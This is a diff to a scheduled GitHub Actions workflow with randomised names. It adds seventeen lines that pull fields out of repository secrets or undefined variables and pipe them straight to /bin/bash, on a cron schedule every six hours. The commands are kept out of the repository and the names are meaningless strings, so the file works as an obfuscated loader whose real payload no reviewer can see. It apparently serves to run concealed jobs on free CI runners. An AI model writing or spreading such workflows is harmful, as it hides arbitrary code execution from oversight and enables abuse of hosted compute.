@@ -1,10 +1,11 @@
 name: songbingjia7986
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
+    - cron: '52 3/6 * * *'
 
-jobs:  # 7980
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +13,23 @@ jobs:  # 7980
       - uses: actions/checkout@v4
       - name: songbingjia7986
         env:
-          ame633: ${{ secrets.ame633 }}
+          jknn4: ${{ secrets.jknn4 }}
         run: |
-          echo $ame633 | jq -r .eovo950 | /bin/bash
-          echo $pwhb34 | jq -r .wvkn5609 | /bin/bash
-          echo $k74712 | jq -r .ncxyi24138 | /bin/bash
-          echo $sdes38 | jq -r .v4703 | /bin/bash
-          echo $nwtyu26 | jq -r .esfap8 | /bin/bash
-          echo $llr413 | jq -r .korf4 | /bin/bash
-          echo $ojzb758 | jq -r .y73697 | /bin/bash
+          echo $jknn4 | jq -r .hknhu237 | /bin/bash
+          echo $tkdli51837 | jq -r .zqsa08037 | /bin/bash
+          echo $ezy085 | jq -r .slsz7060 | /bin/bash
+          echo $go8 | jq -r .l86 | /bin/bash
+          echo $xaxpk0 | jq -r .gzz28514 | /bin/bash
+          echo $had04 | jq -r .mcnp33 | /bin/bash
+          echo $csvz51335 | jq -r .wk09 | /bin/bash
+          echo $ztjt1469 | jq -r .dxxzw847 | /bin/bash
+          echo $qx09 | jq -r .bzroa1844 | /bin/bash
+          echo $eqj7 | jq -r .pn60 | /bin/bash
+          echo $sz43186 | jq -r .bnl33 | /bin/bash
+          echo $gua5983 | jq -r .hez34 | /bin/bash
+          echo $k89999 | jq -r .ukl66085 | /bin/bash
+          echo $gh487 | jq -r .blk03746 | /bin/bash
+          echo $oh63826 | jq -r .yzx98043 | /bin/bash
+          echo $v9 | jq -r .hd815 | /bin/bash
+          echo $d2 | jq -r .x265 | /bin/bash
 
